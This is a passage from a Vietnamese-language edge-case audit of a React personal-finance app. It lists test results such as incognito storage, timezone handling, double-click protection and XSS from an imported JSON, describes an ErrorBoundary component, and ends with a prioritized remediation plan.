| 16 | `EDGE-16` | Incognito / Private Mode | Medium | ✅ PASS | Wrap an toàn `getStorage()` + RAM in-memory session |
| 17 | `EDGE-17` | Xóa Cache/Data thủ công | Medium | ✅ PASS | Tự phục hồi trạng thái khởi tạo an toàn |
| 18 | `EDGE-18` | Timezone đổi | Medium | ✅ PASS | Chuỗi ngày ISO `'YYYY-MM-DD'` + `vnDate()` cố định UTC+7 |
| 19 | `EDGE-19` | Locale đổi (chấm/phẩy) | Low | ✅ PASS | Store chỉ lưu số thực `number`, format lúc render |
| 20 | `EDGE-20` | Trùng lịch/hạn thanh toán | Low | ✅ PASS | Nhóm theo mảng sự kiện (Group by Day) |
| 21 | `EDGE-21` | AI action apply 2 lần | High | ⚠️ WARN | Cần bổ sung Idempotency deduplication |
| 22 | `EDGE-22` | Double click CTA | Medium | ⚠️ WARN | Thêm `isSubmitting` disable nút bấm khi click |
| 23 | `EDGE-23` | Interrupted save | Medium | ✅ PASS | Thao tác ghi đồng bộ + fail-safe lúc reload |
| 24 | `EDGE-24` | Import JSON độc hại (XSS) | Critical | ✅ PASS | React auto-escape, zero `dangerouslySetInnerHTML` |
| 25 | `EDGE-25` | Reset module gây mồ côi | Medium | ✅ PASS | Decoupled entities, tính toán độc lập không foreign key |

---

## Đánh Giá Lưới An Toàn Tầng Ứng Dụng (ErrorBoundary)

Ứng dụng được bảo vệ toàn diện bởi component `ErrorBoundary` (`client/src/components/ErrorBoundary.tsx`) với các tính năng vượt trội:
1. **Bắt lỗi render bất đồng bộ:** Tự động phát hiện lỗi `ChunkLoadError` khi có phiên bản build mới và cung cấp nút reload thông minh.
2. **Giao diện lỗi chuẩn Light Mode:** Nền sáng chữ đậm, tuyệt đối không dùng glassmorphism, hiển thị icon và thông báo thân thiện bằng 3 ngôn ngữ (`vi`, `en`, `zh`).
3. **Sao chép mã lỗi một chạm:** Hỗ trợ người dùng sao chép chi tiết Call Stack và URL để báo cáo kỹ thuật dễ dàng.
4. **3 Hành động khôi phục nhanh:** Thử lại (Retry) | Tải lại trang (Reload) | Quay về trang chủ (Back to Home).

---

## Kế Hoạch Hành Động Khắc Phục (Actionable Remediation Plan)

### Ưu tiên 1 (P1 - Cần áp dụng ngay)
1. **Bổ sung lọc mảng chống `null`/`undefined`:** Thêm `.filter(Boolean)` vào toàn bộ các selector trong `client/src/state/chon.ts`.
2. **Ngăn chặn Double-click CTA:** Thêm trạng thái khóa nút bấm trong các modal thêm/sửa giao dịch và tài sản.
3. **Đồng bộ đa Tab (Cross-Tab Sync):** Thêm listener lắng nghe sự kiện `storage` trong `store.tsx`.

### Ưu tiên 2 (P2 - Tối ưu hóa trung hạn)
1. **Schema Migration Pipeline:** Tạo cơ chế di chuyển schema tuần tự khi có cập nhật cấu trúc dữ liệu v2.
2. **Kiểm tra lũy đẳng AI Action (Idempotency):** Gán mã `actionId` hoặc đối soát thuộc tính trước khi ghi nhận hành động từ AI Agent.
3. **Ảo hóa danh sách (Virtual List):** Tích hợp phân trang hoặc Virtual List cho sổ cái giao dịch quy mô lớn (>1.000 items).
